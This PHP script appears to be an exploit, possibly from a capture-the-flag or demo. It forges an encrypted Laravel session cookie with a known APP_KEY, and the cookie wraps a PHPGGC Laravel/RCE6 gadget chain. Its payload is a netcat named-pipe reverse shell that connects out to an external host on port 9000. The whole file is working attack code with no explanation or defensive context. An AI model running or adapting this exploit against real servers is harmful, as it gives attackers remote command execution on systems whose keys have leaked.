<?php
$cipher = 'AES-256-CBC';
$app_key = 'base64:koNteYZxVmzos/xmAoJhLN7SIwFrSZFqOQ3PHrtLJww=';
$chain_name = 'Laravel/RCE6';
$payload = 'system(\'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc johnhammond.org 9000 >/tmp/f\');';

// Use PHPGGC to generate the gadget chain
$chain = shell_exec('/opt/phpggc/phpggc '.$chain_name.' "'.$payload.'"');
// Key can be stored as base64 or string.
if( explode(":", $app_key)[0] === 'base64' ) {
        $app_key = base64_decode(explode(':', $app_key)[1]);
}
// Create cookie
$iv = random_bytes(openssl_cipher_iv_length($cipher));
$value = \openssl_encrypt($chain, $cipher, $app_key, 0, $iv);
$iv = base64_encode($iv);
$mac = hash_hmac('sha256', $iv.$value, $app_key);
$json = json_encode(compact('iv', 'value', 'mac'));

// Print the results
die(urlencode(base64_encode($json)));

?>